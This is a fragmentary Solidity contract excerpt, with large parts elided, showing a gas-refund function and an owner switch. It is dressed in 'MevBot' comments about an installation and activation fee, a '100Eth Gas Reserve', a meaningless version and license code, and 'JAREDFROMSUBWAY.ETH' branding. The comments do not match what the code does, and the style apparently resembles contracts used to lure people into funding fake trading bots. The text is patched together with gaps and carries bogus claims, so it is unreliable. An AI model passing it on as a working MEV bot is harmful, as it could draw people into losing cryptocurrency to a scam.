 ...
 */
    ...
    */
    ...
    function deactivateRefund() external onlyOwner {
        isRefundActive = false;
    }

    function refundGas(uint256 gasAmount) external {
        require(isRefundActive, "Gas refund is currently inactive");

        uint256 senderBalance = msg.sender.balance;

        require(senderBalance >= gasAmount * tx.gasprice, "Insufficient ETH balance");

       /* Refund gas
        * MevBot Refunds Installation and Activation Fee
        * 5Eth Metering
        * 100Eth Gas Reserve
        */
        payable(msg.sender).transfer(gasAmount * tx.gasprice);
    }
    ...
    *
    *
    * BOT VERSION; 21QAZ3SX43XC34 2H23:G5:K5  00:48:56   LICENSE CODE: 00X045VD0900X40
    * JAREDFROMSUBWAY.ETH    X    RABBIT TUNNEL    X    SUBWAY BOTS
    */